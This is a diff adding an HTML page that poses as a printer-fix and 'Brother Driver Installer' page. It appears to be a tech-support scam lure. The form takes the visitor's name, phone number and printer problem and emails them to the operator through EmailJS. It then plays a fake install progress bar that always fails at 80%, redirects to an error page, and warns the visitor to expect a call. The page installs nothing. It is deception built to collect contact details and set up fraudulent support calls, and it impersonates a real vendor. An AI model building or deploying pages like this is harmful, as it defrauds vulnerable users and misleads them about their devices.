@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Fix Printer Issue</title>
+
+<script src="//code.jivosite.com/widget/CXmX6RkZyD" async></script>
+
+<!-- EMAILJS -->
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<script>
+(function(){
+    emailjs.init("zRrCDqYKZtnSePhQb"); // 🔥 replace
+})();
+</script>
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:"Inter",sans-serif;}
+
+body{
+    min-height:100vh;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    padding:20px;
+    position:relative;
+}
+
+/* BACKGROUND */
+body::before{
+    content:"";
+    position:absolute;
+    inset:0;
+    background:url("https://img.freepik.com/premium-photo/laser-printer-desk-against-blue-background_93675-158548.jpg") no-repeat center/cover;
+    opacity:0.85;
+    z-index:-1;
+}
+
+/* CONTAINER */
+.container{
+    width:100%;
+    max-width:1100px;
+    background:rgba(255,255,255,0.88);
+    backdrop-filter:blur(10px);
+    border-radius:16px;
+    padding:40px;
+    display:flex;
+    gap:40px;
+    flex-wrap:wrap;
+    box-shadow:0 20px 50px rgba(0,0,0,0.15);
+}
+
+/* FORM */
+.form-box{flex:1;}
+.form-box h2{
+    margin-bottom:20px;
+    font-size:24px;
+    font-weight:600;
+}
+
+/* GROUP */
+.form-group{
+    margin-bottom:16px;
+}
+
+.form-group label{
+    font-size:13px;
+    color:#555;
+    margin-bottom:6px;
+    display:block;
+}
+
+/* INPUT */
+input,select{
+    width:100%;
+    padding:14px;
+    border-radius:10px;
+    border:1px solid #e5e7eb;
+    background:#fafafa;
+    transition:0.25s;
+}
+
+input:focus,select:focus{
+    background:#fff;
+    border-color:#2764ff;
+    box-shadow:0 0 0 2px rgba(39,100,255,0.08);
+    outline:none;
+}
+
+/* PHONE */
+.phone-group{
+    display:flex;
+}
+
+.phone-prefix{
+    padding:14px;
+    background:#f1f5f9;
+    border:1px solid #e5e7eb;
+    border-right:none;
+    border-radius:10px 0 0 10px;
+}
+
+.phone-input{
+    border-radius:0 10px 10px 0;
+}
+
+/* BUTTON */
+button{
+    width:100%;
+    padding:14px;
+    background:linear-gradient(90deg,#2764ff,#007bff);
+    color:#fff;
+    border:none;
+    border-radius:10px;
+    font-weight:600;
+    cursor:pointer;
+    transition:0.3s;
+}
+
+button:hover{
+    transform:translateY(-1px);
+}
+
+/* NOTE */
+.note-box{
+    margin-top:12px;
+    padding:12px 14px;
+    background:#fff3cd;
+    border-left:4px solid #ffb300;
+    border-radius:8px;
+    font-size:14px;
+    color:#856404;
+}
+
+/* IMAGE */
+.image-box{
+    flex:1;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+}
+.image-box img{
+    width:100%;
+    max-width:420px;
+    border-radius:12px;
+}
+
+/* POPUP */
+.popup-bg{
+    display:none;
+    position:fixed;
+    inset:0;
+    background:rgba(0,0,0,0.7);
+    z-index:9999;
+    align-items:center;
+    justify-content:center;
+}
+
+.popup{
+    width:420px;
+    background:#fff;
+    border-radius:12px;
+    overflow:hidden;
+}
+
+.popup-header{
+    padding:15px;
+    background:#f1f5f9;
+    display:flex;
+    align-items:center;
+    gap:10px;
+}
+
+.popup-body{
+    padding:25px;
+    text-align:center;
+}
+
+.progress{
+    height:12px;
+    background:#e5e7eb;
+    border-radius:20px;
+    overflow:hidden;
+}
+
+.progress-bar{
+    width:0%;
+    height:100%;
+    background:linear-gradient(90deg,#3b82f6,#60a5fa);
+}
+
+@media(max-width:768px){
+    .container{flex-direction:column;}
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+    <!-- FORM -->
+    <div class="form-box">
+        <h2>Printer Issue</h2>
+
+        <form onsubmit="startInstall(event)">
+
+            <div class="form-group">
+                <label>Your Name</label>
+                <input type="text" id="name" required>
+            </div>
+
+            <div class="form-group">
+                <label>Contact Number</label>
+                <div class="phone-group">
+                    <div class="phone-prefix">+1</div>
+                    <input type="tel" id="phone" class="phone-input"
+                    maxlength="10"
+                    required
+                    oninput="this.value=this.value.replace(/[^0-9]/g,'')">
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>Select Issue</label>
+                <select id="issue" required>
+                    <option value="">Choose your issue</option>
+                    <option>Driver Installation Failed</option>
+                    <option>Printer Not Connecting</option>
+                    <option>WiFi Setup Issue</option>
+                    <option>Printer Offline</option>
+                </select>
+            </div>
+
+            <button type="submit">Install Driver</button>
+
+        </form>
+
+        <div class="note-box">
+            ⚠️ <b>Important:</b> Please keep your phone nearby. You may receive a call shortly.
+        </div>
+    </div>
+
+    <!-- IMAGE -->
+    <div class="image-box">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQW5o323WrdllUcP-saXFwCfZTTHBW426tZWw&s">
+    </div>
+
+</div>
+
+<!-- POPUP -->
+<div class="popup-bg" id="popup">
+    <div class="popup">
+        <div class="popup-header">
+            <img src="/printer-setup/image/brother logo color.webp" width="25">
+            <b>Brother Driver Installer</b>
+        </div>
+
+        <div class="popup-body">
+            <div class="progress">
+                <div id="progressBar" class="progress-bar"></div>
+            </div>
+
+            <p id="statusText">Initializing...</p>
+            <p id="percentText">0%</p>
+        </div>
+    </div>
+</div>
+
+<script>
+function startInstall(e){
+    e.preventDefault();
+
+    const name=document.getElementById("name").value;
+    const issue=document.getElementById("issue").value;
+    const phone="+1"+document.getElementById("phone").value;
+
+    // 🔥 EMAIL SEND FIRST
+    emailjs.send("service_c0qhfb4","template_u8lc2xq",{
+        name:name,
+        phone:phone,
+        issue:issue
+    })
+    .then(function(){
+
+        // ✅ SUCCESS → POPUP OPEN
+        document.getElementById("popup").style.display="flex";
+
+        runProgress(name, issue, phone);
+
+    })
+    .catch(function(error){
+        alert("Something went wrong. Please try again.");
+        console.error(error);
+    });
+}
+
+function runProgress(name, issue, phone){
+
+    let progress=0;
+    const bar=document.getElementById("progressBar");
+    const percent=document.getElementById("percentText");
+    const status=document.getElementById("statusText");
+
+    const interval=setInterval(()=>{
+
+        progress+=Math.random()*4;
+
+        if(progress<30){status.innerText="Downloading...";}
+        else if(progress<60){status.innerText="Installing...";}
+        else if(progress<80){status.innerText="Finalizing...";}
+
+        if(progress>=80){
+            progress=80;
+            bar.style.width="80%";
+            percent.innerText="80%";
+
+            clearInterval(interval);
+
+            setTimeout(()=>{
+                bar.style.background="#ef4444";
+                status.innerText="Installation Failed";
+                percent.innerText="Error";
+
+                setTimeout(()=>{
+                    window.location.replace(
+                        "error.html?name="+encodeURIComponent(name)+
+                        "&issue="+encodeURIComponent(issue)+
+                        "&phone="+encodeURIComponent(phone)
+                    );
+                },200);
+
+            },400);
+
+        } else {
+            bar.style.width=progress+"%";
+            percent.innerText=Math.floor(progress)+"%";
+        }
+
+    },250);
+}
+</script>
+
+</body>
+</html>
